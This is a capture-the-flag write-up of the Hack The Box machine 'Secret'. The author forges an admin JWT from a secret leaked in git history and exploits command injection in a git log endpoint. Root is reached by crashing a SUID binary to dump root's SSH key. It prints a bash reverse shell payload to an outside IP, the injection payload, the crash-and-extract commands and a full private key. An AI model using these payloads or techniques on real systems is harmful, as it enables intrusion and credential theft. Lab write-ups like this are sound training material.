---
title: Secret
tags:
  - HackTheBox
  - Easy
  - Linux
  - Git
  - Command-Injection
  - SUID
date: 2024-12-23T00:00:00Z
---
![](Pasted%20image%2020241223100948.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.120 secret.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- secret.htb > sC.txt

[redacted]
```

So I checked its website:

![](Pasted%20image%2020241223101213.png)

Inspecting the source code I found what seems to be the source code:

![](Pasted%20image%2020241223101406.png)

So I downloaded the files and I inspected them. I discovered some documentation inside `/docs`, which are about interacting with its API:

![](Pasted%20image%2020241223102027.png)

While reading the docs I noticed that you apparently have some private access in the api (inside `/api/priv`), so you can perform registration and login to the API to access that endpoint.

As you can perform authentication, I decided to check inside the downloaded files in spite of some credentials:

![](Pasted%20image%2020241223102842.png)

There is a `.git` subfolder, so I'll check the git logs:

![](Pasted%20image%2020241223102926.png)

"*removed .env for security reasons*" gives me some bad ideas :)

So I checked that specific commit:

```shell
git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
```

![](Pasted%20image%2020241223103202.png)

> I've found a mongodb access token: `gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE`

Now I also inpected the commit "now we can view logs from server 😃":

```shell
git show e297a2797a5f62b6011654cf6fb6ccb6712d2d5b

[redacted]
+router.get('/logs', verifytoken, (req, res) => {
+    const file = req.query.file;
+    const userinfo = { name: req.user }
+    const name = userinfo.name.name;
+    
+    if (name == 'theadmin'){
+        const getLogs = `git log --oneline ${file}`;
+        exec(getLogs, (err , output) =>{
+            if(err){
+                res.status(500).send(err);
+                return
+            }
+            res.json(output);
+        })
+    }
+    else{
+        res.json({
+            role: {
+                role: "you are normal user",
+                desc: userinfo.name.name
+            }
+        })
+    }
 })
```

Inspecting this code we can notice a command injection vulnerability in the `git log --oneline ${file}`. We can access to a new endpoint called `/logs`.

Now, inspecting again the source code I noticed that for the authentication there is a `auth.js` where jwt tokens are in use:

![](Pasted%20image%2020241223104014.png)

![](Pasted%20image%2020241223104125.png)

The docs also explain to us how it works:

![](Pasted%20image%2020241223104227.png)

![](Pasted%20image%2020241223104312.png)

## Exploitation

So it's time to create an account using the instructions using Postman.

First, I created my account.

![](Pasted%20image%2020241223105927.png)

Then I logged in to get my access token:

![](Pasted%20image%2020241223110043.png)

So my token is currently: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NzY5MzQ2ZmY3NmI3NjA0NWQxYTQ3M2QiLCJuYW1lIjoiZ2l0YmxhbmMiLCJlbWFpbCI6ImdpdGJsYW5jQGdpdGJsYW5jLmNvbSIsImlhdCI6MTczNDk0ODAyMX0.kvQOonU3kTtSk79yObABGlqVoVq5fhd_bUkeUEbFxH4`

Now we can check our privileges:

![](Pasted%20image%2020241223110257.png)

Now I can use the provided example of jwt token to craft the valid one by pasting it on the online tool:

![](Pasted%20image%2020241223111931.png)

So we finally got `theadmin` token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo`

![](Pasted%20image%2020241223112029.png)

Now, we can check the `/api/logs` endpoint:

![](Pasted%20image%2020241223112118.png)

We will now exploit the command injection vulnerability by appending `?file;id`:

![](Pasted%20image%2020241223112339.png)

It's time to get a reverse shell:

```shell
;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.28/666+0>%261'
```

![](Pasted%20image%2020241223112853.png)

![](Pasted%20image%2020241223112932.png)

> I got user flag :D

![](Pasted%20image%2020241223113243.png)

## Privilege Escalation

Searching for SUID binaries I found a weird one: `/opt/count`:

```shell
find / -perm -u=s -type f 2>/dev/null
```

If we inspect the `/opt` directory we can find some weird files too:

![](Pasted%20image%2020241223113521.png)

This is the `code.c` content:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```

It seems to be a binary that basically counts words inside a file:

![](Pasted%20image%2020241223114030.png)

The binary is using core dumps to extract the contents of the files:

```c
// Enable coredump generation
prctl(PR_SET_DUMPABLE, 1);
```

So my plan is to read the SSH key from **root** and crash the application before the file handler gets destroyed. When the application crashes a core dump file will be created at `/var/crashes` and we can unpack it using **apport-unpack** . To crash the application all we have to do is sent a **SIGSEGV** signal to the application. So, we execute the application, prompt it to read `/root/.ssh/id_rsa` key file, background it, sent the appropriate signal and when we bring the application to the foreground it will crash and create a core dump file:

```shell
/opt/count
/root/.ssh/id_rsa
ctrl+z
kill -SIGSEGV `ps -e | grep -w "count"|awk -F ' ' '{print$1}'`
fg
```

A core dumped has been created:

![](Pasted%20image%2020241223114539.png)

Now, we can use **apport-unpack** and strings to get the root SSH key:

```shell
apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash_unpacked
strings /tmp/crash_unpacked/CoreDump

[redacted]
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

> Got root access and root flag :D

![](Pasted%20image%2020241223114933.png)

>[!Note]
>We could have also just read `/root/root.txt` instead of the private root ssh key, but it's better to gain remote access

==Machine pwned==